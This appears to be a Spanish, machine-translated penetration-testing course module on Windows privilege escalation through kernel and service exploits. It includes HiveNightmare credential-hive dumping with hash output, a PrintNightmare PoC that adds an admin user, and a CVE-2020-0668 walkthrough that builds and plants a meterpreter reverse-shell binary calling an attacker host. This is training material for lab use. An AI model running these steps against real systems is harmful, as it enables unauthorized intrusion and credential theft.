# Exploits de núcleo

---

Es un gran desafío garantizar que todos los escritorios y servidores de los usuarios se actualicen, y el 100% de cumplimiento para todas las computadoras con parches de seguridad probablemente no sea un objetivo alcanzable. Suponiendo que una computadora se haya dirigido a la instalación de actualizaciones, por ejemplo, utilizando SCCM (Microsoft System Center Manager) o WSUS (Windows Server Update Services), todavía hay muchas razones por las que podrían dejar de instalar. Con los años, ha habido muchas exploits de kernel que afectan el sistema operativo Windows desde Windows 2000/XP hasta Windows 10/Server 2016/2019. A continuación se pueden encontrar una tabla detallada de ejecución de código remoto conocido/exploits de escalada de privilegios locales para sistemas operativos de Windows, desglosados ​​por nivel de paquete de servicio, desde Windows XP en adelante hasta servidor 2016.


|Sistema operativo base|XP||||2003|||Vista|||2008||7||2008R2||8|8.1|2012|2012R2|10|2016|
|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
|Paquete de servicio|SP0|SP1|SP2|Sp3|SP0|SP1|SP2|SP0|SP1|SP2|SP0|SP2|SP0|SP1|SP0|SP1|||||||
|MS03-026|•|•|•|•|•|•|•||||||||||||||||
|MS05-039|•|•|•||•|•|||||||||||||||||
|MS08-025|•|•|•||•|•|•|•|•||•||||||||||||
|MS08-067|•|•|•|•|•|•|•|•|•||•||||||||||||
|MS08-068|•|•|•|•|•|•|•|•|•||•||||||||||||
|MS09-012|•|•|•|•|•|•|•|•|•||•||||||||||||
|MS09-050||||||||•|•|•|•|•|||||||||||
|MS10-015|||•|•|•|•|•|•|•|•|||||||||||||
|MS10-059||||||||•|•|•|•|•|•||•||||||||
|MS10-092||||||||•|•|•|•|•|•||•||||||||
|MS11-011||||•|•|•|•|•|•|•|•|•|•||•||||||||
|MS11-046||||•|•|•|•|•|•|•|•|•|•|•|•|•|||||||
|MS11-062||||•|•|•|•||||||||||||||||
|MS11-080||||•|•|•|•||||||||||||||||
|MS13-005||||||||•|•|•|•|•|•|•|•|•|•||•||||
|MS13-053||||•|•|•|•|•|•|•|•|•|•|•|•|•|•||•||||
|MS13-081|||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•||•||||
|MS14-002||||•|•|•|•||||||||||||||||
|MS14-040|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||
|MS14-058|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||
|MS14-062|||||•|•|•||||||||||||||||
|MS14-068|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||
|MS14-070|||||•|•|•||||||||||||||||
|MS15-001|||||||||||||•|•|•|•|•|•|•|•|||
|MS15-010|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||
|MS15-051|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||
|MS15-061|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||
|MS15-076|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||
|MS15-078||||||||•|•|•|•|•|•|•|•|•|•|•|•|•|||
|MS15-097||||||||•|•|•|•|•|•|•|•|•|•|•|•|•|•||
|MS16-016||||||||•|•|•|•|•|•|•|•|•|||||||
|MS16-032||||||||•|•|•|•|•|•|•|•|•||•|•|•|||
|MS16-135||||||||•|•|•|•|•|•|•|•|•||•|•|•|•|•|
|MS17-010||||||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|
|CVE-2017-0213: com Marshaler agregado|||||||||||||•|•|•|•|•|•|•|•|•|•|
|Papa caliente|||||||||||||•|•|•|•|•|•|•|•|•||
|Smashedpotato|||||||||||||•|•|•|•|•|•|•|•|•||


Nota: Esta tabla no está 100% completa y no pasa más allá de 2017. A partir de hoy, hay vulnerabilidades más conocidas para las versiones más nuevas del sistema operativo e incluso el servidor 2019.

Este[sitio](https://msrc.microsoft.com/update-guide/vulnerability)es útil para buscar información detallada sobre las vulnerabilidades de seguridad de Microsoft. Esta base de datos tiene 4.733 vulnerabilidades de seguridad ingresadas al momento de escribir, lo que muestra la superficie de ataque masiva que presenta un entorno de Windows.

Como podemos ver en esta tabla, hay muchas exploits que funcionan para Windows XP a través de Server 2012R2. A medida que llegamos a Windows 10 y Server 2016, hay menos hazañas conocidas. Esto se debe en parte a los cambios en el sistema operativo a lo largo del tiempo, incluidas las mejoras de seguridad y la deprecación de versiones anteriores de protocolos como SMB. Una cosa importante a tener en cuenta de esta tabla es que cuando se descubren o se liberan nuevas vulnerabilidades (como MS17-010), estos generalmente se reducen y afectan las versiones del sistema operativo previo. Es por eso que es vital mantenerse al tanto de los parches o la actualización, retirar o segregar los sistemas de Windows que han alcanzado el final de la vida. Exploraremos esto con más profundidad más adelante en este módulo.

Es importante tener en cuenta que mientras algunos de los ejemplos anteriores`are`Vulnerabilidades de ejecución de código remoto, podemos usarlas fácilmente para aumentar los privilegios. Un ejemplo es que si obtenemos acceso a un sistema y notamos un puerto como 445 (servicio SMB) que no es accesible desde el exterior, podemos privilegiarse si es vulnerable a algo como EternalBlue (MS17-010). En este caso, podríamos atender el puerto en cuestión para ser accesible desde nuestro host de ataque o ejecutar la exploit en cuestión localmente para aumentar los privilegios.

---

## Vulnerabilidades notables

A lo largo de los años, ha habido muchas vulnerabilidades de ventanas de alto impacto que se pueden aprovechar para aumentar los privilegios, algunos son vectores de escalada de privilegios puramente locales y otros que tienen fallas de ejecución de código remoto (RCE) que pueden usarse para aumentar los privilegios al reenviar un puerto local. Un ejemplo de este último sería aterrizar en una caja que no permite el acceso al puerto 445 desde el exterior, realizando el puerto hacia adelante para acceder a este puerto desde nuestro cuadro de ataque y aprovechar una falla de ejecución de código remoto contra el servicio SMB para aumentar los privilegios. A continuación se presentan algunas vulnerabilidades de Windows de gran impacto a lo largo de los años que se pueden aprovechar a los privilegios intensos.

`MS08-067`- Esta fue una vulnerabilidad de ejecución de código remoto en el servicio "servidor" debido al manejo inadecuado de las solicitudes RPC. Esto afectó a Windows Server 2000, 2003 y 2008 y Windows XP y Vista y permite que un atacante no autenticado ejecute código arbitrario con privilegios del sistema. Aunque generalmente se encuentra en entornos de clientes como una vulnerabilidad de ejecución de código remoto, podemos aterrizar en un host donde el servicio SMB se bloquea a través del firewall. Podemos usar esto para aumentar los privilegios después de reenviar el puerto 445 de regreso a nuestra caja de ataque. Aunque esta es una vulnerabilidad "heredada", todavía veo esto aparece de vez en cuando en grandes organizaciones, especialmente aquellas en la industria médica que pueden estar ejecutando aplicaciones específicas que solo funcionan en versiones más antiguas de Windows Server/Desktop. No debemos descartar vulnerabilidades más antiguas incluso en 2021. Nos encontraremos con cada escenario bajo el sol mientras realizamos evaluaciones de clientes y debemos estar listos para tener en cuenta todas las posibilidades. La caja[Legado](https://0xdf.gitlab.io/2019/02/21/htb-legacy.html)En la plataforma Hack the Box muestra esta vulnerabilidad desde el punto de vista de ejecución de código remoto. Hay una versión independiente y de metasploteo de esta exploit.

`MS17-010`- También conocido como[Eterna](https://en.wikipedia.org/wiki/EternalBlue)es una vulnerabilidad de ejecución de código remoto que fue parte del kit de herramientas de FuzzBunch lanzado en el[Corredores de sombra](https://en.wikipedia.org/wiki/The_Shadow_Brokers)filtración. Este exploit aprovecha una vulnerabilidad en el protocolo SMB porque el protocolo SMBV1 maneja los paquetes de manejo especialmente diseñados por un atacante, lo que lleva a la ejecución de código arbitraria en el host de destino como la cuenta del sistema. Al igual que con MS08-067, esta vulnerabilidad también se puede aprovechar como un vector de escalada de privilegios locales si aterrizamos en un anfitrión donde el puerto 445 está fuera de firewalling. Hay varias versiones de esta exploit para el marco de metasploit, así como los scripts de exploit independientes. Este ataque fue exhibido en el[Azul](https://0xdf.gitlab.io/2021/05/11/htb-blue.html)Box en Hack the Box, nuevamente desde el punto de vista remoto.

`ALPC Task Scheduler 0-Day`- El método de punto final ALPC utilizado por el servicio de programador de tareas de Windows podría usarse para escribir DACL arbitrarios a`.job`archivos ubicados en el`C:\Windows\tasks`directorio. Un atacante podría aprovechar esto para crear un enlace difícil a un archivo que el atacante controla. La exploit para este defecto usó el[Schrpcsetsecurity](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/a8172c11-a24a-4ad9-abd0-82bcf29d794d?redirectedfrom=MSDN)Función API para llamar a un trabajo de impresión utilizando la impresora XPS y secuestrar el sistema DLL como Autoridad NT \ a través del servicio Spooler. Una reseña en profundidad está disponible[aquí](https://blog.grimm-co.com/2020/05/alpc-task-scheduler-0-day.html). La caja de pirateo de la caja[Holgazán](https://snowscan.io/htb-writeup-hackback/)se puede usar para probar esta exploit de escalada de privilegios.

El verano de 2021 reveló un tesoro de nuevas ventanas y la ejecución de código remoto relacionado con el directorio y las defectos de escalada de privilegios locales para deleite de los probadores de penetración (y atacantes del mundo real), y estoy seguro de que se gemen de nuestros colegas trabajadores en el lado de la defensa de las cosas.

`CVE-2021-36934 HiveNightmare, aka SeriousSam`es un defecto de Windows 10 que da como resultado que cualquier usuario tenga derecho a leer el registro de Windows y acceder a la información confidencial independientemente del nivel de privilegio. Los investigadores desarrollaron rápidamente un exploit de POC para permitir la lectura de las colmenas SAM, el sistema y el registro de seguridad y crear copias de ellas para procesar fuera de línea más tarde y extraer hash de contraseña (incluido el administrador local) utilizando una herramienta como SecretSdump.py. Se puede encontrar más información sobre este defecto[aquí](https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5)y[este](https://github.com/GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe)Exploit Binary se puede usar para crear copias de los tres archivos a nuestro directorio de trabajo. Este[guion](https://github.com/GossiTheDog/HiveNightmare/blob/master/Mitigation.ps1)Se puede usar para detectar el defecto y también solucionar el problema de ACL. Echemos un vistazo.

#### Verificación de permisos en el archivo SAM

Podemos verificar esta vulnerabilidad utilizando`icacls`Para verificar los permisos en el archivo SAM. En nuestro caso, tenemos una versión vulnerable ya que el archivo es legible por el`BUILTIN\Users`grupo.

  Exploits de núcleo

```cmd-session
C:\htb> icacls c:\Windows\System32\config\SAM

C:\Windows\System32\config\SAM BUILTIN\Administrators:(I)(F)
                               NT AUTHORITY\SYSTEM:(I)(F)
                               BUILTIN\Users:(I)(RX)
                               APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                               APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

La explotación exitosa también requiere la presencia de una o más copias de la sombra. La mayoría de los sistemas de Windows 10 tendrán`System Protection`habilitado de forma predeterminada que creará copias de seguridad periódicas, incluida la copia de la sombra necesaria para aprovechar este defecto.

#### Realizar ataques de ataque y análisis de la contraseña

Este[POC](https://github.com/GossiTheDog/HiveNightmare)Se puede utilizar para realizar el ataque, creando copias de las colmenas de registro mencionadas:

  Exploits de núcleo

```powershell-session
PS C:\Users\htb-student\Desktop> .\HiveNightmare.exe

HiveNightmare v0.6 - dump registry hives as non-admin users

Specify maximum number of shadows to inspect with parameter if wanted, default is 15.

Running...

Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM

Success: SAM hive from 2021-08-07 written out to current working directory as SAM-2021-08-07

Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY

Success: SECURITY hive from 2021-08-07 written out to current working directory as SECURITY-2021-08-07

Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM

Success: SYSTEM hive from 2021-08-07 written out to current working directory as SYSTEM-2021-08-07


Assuming no errors above, you should be able to find hive dump files in current working directory.
```

Estas copias se pueden transferir nuevamente al host de ataque, donde se usa Impacket-SecretsDump para extraer los hash:

  Exploits de núcleo

```shell-session
xnoxos@htb[/htb]$ impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Target system bootKey: 0xebb2121de07ed08fc7dc58aa773b23d6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c93428723187f868ae2f99d4fa66dceb:::
mrb3n:1001:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x3c7b7e66890fb2181a74bb56ab12195f248e9461
dpapi_userkey:0xc3e6491e75d7cffe8efd40df94d83cba51832a56
[*] NL$KM 
 0000   45 C5 B2 32 29 8B 05 B8  E7 E7 E0 4B 2C 14 83 02   E..2)......K,...
 0010   CE 2F E7 D9 B8 E0 F0 F8  20 C8 E4 70 DD D1 7F 4F   ./...... ..p...O
 0020   42 2C E6 9E AF 57 74 01  09 88 B3 78 17 3F 88 54   B,...Wt....x.?.T
 0030   52 8F 8D 9C 06 36 C0 24  43 B9 D8 0F 35 88 B9 60   R....6.$C...5..`
NL$KM:45c5b232298b05b8e7e7e04b2c148302ce2fe7d9b8e0f0f820c8e470ddd17f4f422ce69eaf5774010988b378173f8854528f8d9c0636c02443b9d80f3588b960
```

`CVE-2021-1675/CVE-2021-34527 PrintNightmare`es un defecto en[Rpcaddprinterdriver](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/f23a7519-1c77-4069-9ace-a6d8eae47c22)que se utiliza para permitir la impresión remota y la instalación del controlador. Esta función está destinada a dar a los usuarios con el privilegio de Windows`SeLoadDriverPrivilege`La capacidad de agregar controladores a una bobina de impresión remota. Este derecho generalmente está reservado para los usuarios en el grupo de administradores incorporados y los operadores de impresión que pueden tener una necesidad legítima de instalar un controlador de impresora en la máquina de un usuario final de forma remota. La falla permitió a cualquier usuario autenticado agregar un controlador de impresión a un sistema de Windows sin tener el privilegio mencionado anteriormente, permitiendo que un atacante se ejecute la ejecución del código remoto como sistema en cualquier sistema afectado. El defecto afecta a cada versión compatible de Windows, y es que la bobina de impresión se ejecuta de forma predeterminada en controladores de dominio, Windows 7 y 10, y a menudo está habilitado en los servidores de Windows, esto presenta una superficie de ataque masiva, por lo tanto, "pesadilla". Microsoft lanzó inicialmente un parche que no solucionó el problema (y la orientación temprana era deshabilitar el servicio de boteador, lo cual no es práctico para muchas organizaciones) pero lanzó un segundo[parche](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)En julio de 2021, junto con la orientación para verificar que la configuración específica del registro se establezca en`0`o no definido. Una vez que esta vulnerabilidad se hizo pública, las exploits de POC se publicaron bastante rápido.[Este](https://github.com/cube0x0/CVE-2021-1675)versión por[@cubo0x0](https://twitter.com/cube0x0)Se puede usar para ejecutar una DLL maliciosa de forma remota o local utilizando una versión modificada de Impacket. El repositorio también contiene una implementación de C#. Este[Implementación de PowerShell](https://github.com/calebstewart/CVE-2021-1675)Se puede usar para una escalada rápida de privilegios locales. De manera predeterminada, este script agrega un nuevo usuario de administración local, pero también podemos suministrar una DLL personalizada para obtener un shell inverso o similar si agregar un usuario administrador local no está en alcance.

#### Comprobando el servicio de carreras

Podemos verificar rápidamente si el servicio Spooler se está ejecutando con el siguiente comando. Si no se está ejecutando, recibiremos un error de "ruta no existe".

  Exploits de núcleo

```powershell-session
PS C:\htb> ls \\localhost\pipe\spoolss


    Directory: \\localhost\pipe


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
                                                  spoolss
```

#### Agregar administrador local con printnightmare powershell poc

Primero comienzo por[omitir](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)la política de ejecución en el host de destino:

  Exploits de núcleo

```powershell-session
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
```

Ahora podemos importar el script PowerShell y usarlo para agregar un nuevo usuario de administración local.

  Exploits de núcleo

```powershell-session
PS C:\htb> Import-Module .\CVE-2021-1675.ps1
PS C:\htb> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"

[+] created payload at C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_am
d64_ce3301b66255a0fb\Amd64\mxdwdrv.dll"
[+] added user hacker as local administrator
[+] deleting payload from C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
```

#### Confirmando un nuevo usuario administrativo

Si todo fue en planificación, tendremos un nuevo usuario administrativo local bajo nuestro control. Agregar un usuario es "ruidoso", no querríamos hacer esto en un compromiso donde el sigilo es una consideración. Además, nos gustaría consultar con nuestro cliente para garantizar que la creación de cuentas esté en alcance para la evaluación.

  Exploits de núcleo

```powershell-session
PS C:\htb> net user hacker

User name                    hacker
Full Name                    hacker
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            ?8/?9/?2021 12:12:01 PM
Password expires             Never
Password changeable          ?8/?9/?2021 12:12:01 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *None                 
The command completed successfully.
```

Esta es una pequeña muestra de algunas de las vulnerabilidades de mayor impacto. Si bien es imperativo que comprendamos y podamos enumerar y explotar estas vulnerabilidades, también es importante poder detectar y aprovechar defectos menos conocidos.

---

## Enumerando parches faltantes

El primer paso es analizar las actualizaciones instaladas e intentar encontrar actualizaciones que se hayan perdido, por lo tanto, abriendo una ruta de ataque para nosotros.

#### Examinando actualizaciones instaladas

Podemos examinar las actualizaciones instaladas de varias maneras. A continuación hay tres comandos separados que podemos usar.

  Exploits de núcleo

```powershell-session
PS C:\htb> systeminfo
PS C:\htb> wmic qfe list brief
PS C:\htb> Get-Hotfix
```

#### Ver actualizaciones instaladas con WMI

  Exploits de núcleo

```cmd-session
C:\htb> wmic qfe list brief

Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status
Update                        KB4601056               NT AUTHORITY\SYSTEM  3/27/2021                                    
Update                        KB4513661                                    1/9/2020                                     
Security Update               KB4516115                                    1/9/2020                                     
Update                        KB4517245                                    1/9/2020                                     
Security Update               KB4528759                                    1/9/2020                                     
Security Update               KB4535680               NT AUTHORITY\SYSTEM  3/27/2021                                    
Security Update               KB4580325               NT AUTHORITY\SYSTEM  3/27/2021                                    
Security Update               KB5000908               NT AUTHORITY\SYSTEM  3/27/2021                                    
Security Update               KB5000808               NT AUTHORITY\SYSTEM  3/27/2021                                    
```

Podemos buscar cada KB (número de identificación de base de conocimiento de Microsoft) en el[Catálogo de actualizaciones de Microsoft](https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808)Para tener una mejor idea de qué correcciones se han instalado y qué tan atrás puede estar el sistema en las actualizaciones de seguridad. Una búsqueda de`KB5000808`Nos muestra que esta es una actualización de marzo de 2021, lo que significa que el sistema probablemente se atrase en las actualizaciones de seguridad.

---

## CVE-2020-0668 Ejemplo

A continuación, explotemos[Microsoft CVE-2020-0668: Vulnerabilidad de la elevación del núcleo del núcleo de Windows](https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/), que explota una vulnerabilidad arbitraria de movimiento de archivos que aprovecha el rastreo del servicio de Windows. El rastreo de servicios permite a los usuarios solucionar problemas con la ejecución de servicios y módulos mediante la generación de información de depuración. Sus parámetros son configurables utilizando el registro de Windows. Configuración de un valor personalizado MaxFilesize que es más pequeño que el tamaño del archivo solicita que el archivo sea renombrado con un`.OLD`extensión cuando se activa el servicio. Esta operación de movimiento se realiza por`NT AUTHORITY\SYSTEM`, y se puede abusar de mover un archivo de nuestra elección con la ayuda de puntos de montaje y enlaces simbólicos.

#### Comprobación de privilegios de usuario actuales

Verifiquemos los privilegios de nuestro usuario actual.

  Exploits de núcleo

```cmd-session
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

#### Después de la solución de construcción

Podemos usar[este](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668)Explote para CVE-2020-0668, descárguelo y ábralo en Visual Studio dentro de una VM. Construir la solución debe crear los siguientes archivos.

  Exploits de núcleo

```shell-session
CVE-2020-0668.exe
CVE-2020-0668.exe.config
CVE-2020-0668.pdb
NtApiDotNet.dll
NtApiDotNet.xml
```

En este punto, podemos usar el exploit para crear un archivo de nuestra elección en una carpeta protegida como C: \ Windows \ System32. No podemos sobrescribir los archivos de Windows protegidos. Esta escritura de archivo privilegiada debe estar encadenada con otra vulnerabilidad, como[Usodllloader](https://github.com/itm4n/UsoDllLoader)o[Diagestres](https://github.com/xct/diaghub)Para cargar la DLL y aumentar nuestros privilegios. Sin embargo, la técnica USODLLLoader puede no funcionar si las actualizaciones de Windows están pendientes o actualmente se instalan, y el servicio Diaghub puede no estar disponible.

También podemos buscar cualquier software de terceros, que se pueda aprovechar, como el servicio de mantenimiento de Mozilla. Este servicio se ejecuta en el contexto del sistema y es iniciado por usuarios no privilegiados. El binario (no protegido del sistema) para este servicio se encuentra a continuación.

- `C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`

#### Comprobación de permisos en binario

`icacls`confirma que solo hemos leído y ejecutando permisos en este binario basado en la línea`BUILTIN\Users:(I)(RX)`En la salida de comando.

  Exploits de núcleo

```cmd-session
C:\htb> icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                                          BUILTIN\Administrators:(I)(F)
                                                                          BUILTIN\Users:(I)(RX)
                                                                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                                          APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
 
Successfully processed 1 files; Failed processing 0 files
```

#### Generar binario malicioso

Generemos un malicioso`maintenanceservice.exe`binario que se puede usar para obtener una conexión de carcasa inversa de meterpreter de nuestro objetivo.

  Exploits de núcleo

```shell-session
xnoxos@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 645 bytes
Final size of exe file: 7168 bytes
```

#### Anfitrión del binario malicioso

Podemos descargarlo al objetivo usando Curl después de comenzar un servidor Python HTTP en nuestro host de ataque como en el`User Account Control`sección anteriormente. También podemos usar WGet desde el objetivo.

  Exploits de núcleo

```shell-session
xnoxos@htb[/htb]$ $ python3 -m http.server 8080

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.43.13 - - [01/Mar/2022 18:17:26] "GET /maintenanceservice.exe HTTP/1.1" 200 -
10.129.43.13 - - [01/Mar/2022 18:17:45] "GET /maintenanceservice.exe HTTP/1.1" 200 -
```

#### Descargando el binario malicioso

Para este paso necesitamos hacer dos copias del archivo .exe malicioso. Podemos simplemente detenerlo dos veces o hacerlo una vez y hacer una segunda copia.

Necesitamos hacer esto porque ejecutar la exploit corrompe la versión maliciosa de`maintenanceservice.exe`que se mueve a (nuestra copia en`c:\Users\htb-student\Desktop`que estamos apuntando)`c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`que tendremos que dar cuenta más adelante. Si intentamos utilizar la versión copiada, recibiremos un`system error 216`Porque el archivo .exe ya no es un binario válido.

  Exploits de núcleo

```powershell-session
PS C:\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice.exe
PS C:\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice2.exe
```

#### Ejecutando el exploit

A continuación, ejecutemos la exploit. Acepta dos argumentos, los archivos de origen y destino.

  Exploits de núcleo

```cmd-session
C:\htb> C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"                                       

[+] Moving C:\Users\htb-student\Desktop\maintenanceservice.exe to C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe

[+] Mounting \RPC Control onto C:\Users\htb-student\AppData\Local\Temp\nzrghuxz.leo
[+] Creating symbol links
[+] Updating the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Tracing\RASPLAP configuration.
[+] Sleeping for 5 seconds so the changes take effect
[+] Writing phonebook file to C:\Users\htb-student\AppData\Local\Temp\179739c5-5060-4088-a3e7-57c7e83a0828.pbk
[+] Cleaning up
[+] Done!
```

#### Comprobación de permisos de nuevo archivo

El exploit se ejecuta y ejecutando`icacls`Nuevamente muestra la siguiente entrada para nuestro usuario:`WINLPE-WS02\htb-student:(F)`. Esto significa que nuestro usuario de HTB-Student tiene un control total sobre el mantenimiento binario de Mantenanceservice.exe, y podemos sobrescribirlo con una versión no corrupta de nuestro binario malicioso.

  Exploits de núcleo

```cmd-session
C:\htb> icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'

C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe NT AUTHORITY\SYSTEM:(F)
                                                                          BUILTIN\Administrators:(F)
                                                                          WINLPE-WS02\htb-student:(F)
```

#### Reemplazar el archivo con binario malicioso

Podemos sobrescribir el`maintenanceservice.exe`binario en`c:\Program Files (x86)\Mozilla Maintenance Service`Con una buena copia de trabajo de nuestro binario malicioso creado antes antes de proceder para comenzar el servicio. En este ejemplo, descargamos dos copias del binario malicioso para`C:\Users\htb-student\Desktop`, `maintenanceservice.exe`y`maintenanceservice2.exe`. Mueva la buena copia que no fue corrompida por la exploit`maintenanceservice2.exe`al directorio de archivos de programa, asegurarse de cambiar el nombre del archivo correctamente y eliminar el`2`o el servicio no comenzará. El`copy`El comando solo funcionará desde una ventana CMD.EXE, no una consola PowerShell.

  Exploits de núcleo

```cmd-session
C:\htb> copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

        1 file(s) copied.

```

#### Script de recursos de metasploit

A continuación, guarde los siguientes comandos en un[Script de recursos](https://docs.rapid7.com/metasploit/resource-scripts/)Archivo nombrado`handler.rc`.

  Exploits de núcleo

```shell-session
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <our_ip>
set LPORT 8443
exploit
```

#### Lanzamiento de Metasploit con script de recursos

Inicie MetaSploit utilizando el archivo de script de recursos para precargar nuestra configuración.

  Exploits de núcleo

```shell-session
xnoxos@htb[/htb]$ sudo msfconsole -r handler.rc 
                                                 

         .                                         .
 .

      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       '   dB'                     BBP
    dB'dB'dB' dBBP     dBP     dBP BB
   dB'dB'dB' dBP      dBP     dBP  BB
  dB'dB'dB' dBBBBP   dBP     dBBBBBBB

                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  dB' dBP    dB'.BP
                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP

                                                                    .
                .
        o                  To boldly go where no
                            shell has gone before


       =[ metasploit v6.0.9-dev                           ]
+ -- --=[ 2069 exploits - 1123 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Use the resource command to run commands from a file

[*] Processing handler.rc for ERB directives.
resource (handler.rc)> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (handler.rc)> set PAYLOAD windows/x64/meterpreter/reverse_https
PAYLOAD => windows/x64/meterpreter/reverse_https
resource (handler.rc)> set LHOST 10.10.14.3
LHOST => 10.10.14.3
resource (handler.rc)> set LPORT 8443
LPORT => 8443
resource (handler.rc)> exploit
[*] Started HTTPS reverse handler on https://10.10.14.3:8443
```

#### Comenzando el servicio

Iniciar el servicio y debemos obtener una sesión como`NT AUTHORITY\SYSTEM`.

  Exploits de núcleo

```cmd-session
C:\htb> net start MozillaMaintenance 

The service is not responding to the control function

More help is available by typing NET HELPMSG 2186
```

#### Recibir una sesión de meterpreter

Recibiremos un error tratando de iniciar el servicio, pero aún recibiremos una devolución de llamada una vez que se ejecute el Meterpreter Binary.

  Exploits de núcleo

```shell-session
[*] Started HTTPS reverse handler on https://10.10.14.3:8443
